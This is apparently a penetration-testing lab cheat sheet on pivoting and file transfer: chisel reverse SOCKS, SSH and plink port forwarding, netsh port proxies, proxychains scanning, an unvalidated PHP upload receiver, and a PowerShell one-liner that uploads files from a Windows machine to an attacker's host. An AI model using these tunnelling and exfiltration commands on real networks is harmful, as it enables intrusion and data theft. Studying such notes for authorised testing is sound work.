# Tunnel Proxy Transfer

## Tunnel

### chisel

<https://github.com/jpillora/chisel>

```bash
# server
./chisel server -p 4444 --reverse

# client
./chisel client 172.16.8.144:4444 R:socks
```

### ssh

#### ssh forwarding

```bash
#local port forwarding
sudo ssh -N -L 127.0.0.1:8080:192.168.18.1:80 kali@127.0.0.1
```

```bash
# remote port forwarding

sudo ssh -N -R 172.16.8.144:7070:192.168.18.1:80 kali@172.16.8.144
```

#### ssh tunnel

```bash
# forward ssh tunnel
ssh -N -D 127.0.0.1:9090 yuanfh@172.16.8.136
```

```bash
# reverse ssh tunnel
ssh -N -R 9090 kali@172.16.8.144
```

### plink

kali ip:172.16.8.144
intranet http server ip:192.168.18.1:80
so this is a reverse tunnel.

```cmd
scp kali@172.16.8.144/usr/share/windows-binaries/plink.exe .
plink -ssh -l kali -pw kali -R 172.16.8.144:5050:192.168.18.1:80 172.16.8.144
```

request to kali:5050 will be forwarded to intranet http server.

### netsh

local windows ip:172.16.8.152
intranet http server ip:192.168.18.1:80
so this is a forward tunnel.

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=172.16.8.152 connectport=80 connectaddress=192.168.18.1
```

request to windows:8080 will be forwarded to intranet http server.

## Proxy

### proxychains

nmap -sT means TCP connect scan, you shuld add -sT when you use proxychains to scan.

```bash
proxychains nmap -sT -vv 192.168.18.1
```

## Transfer

### download

#### rdp

```bash
xfreerdp /u:offsec /p:lab /v:192.168.159.61 /drive:home,/home/parallels/Downloads
```

### upload

#### appache php server

/var/www/html/upload.php

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir.$_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
```

```bash
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```

```powershell
powershell (new-object System.Net.WebClient).UploadFile('http://172.16.8.144/upload.php', 'C:\Users\Public\nc.exe')
```

## Tips

1.
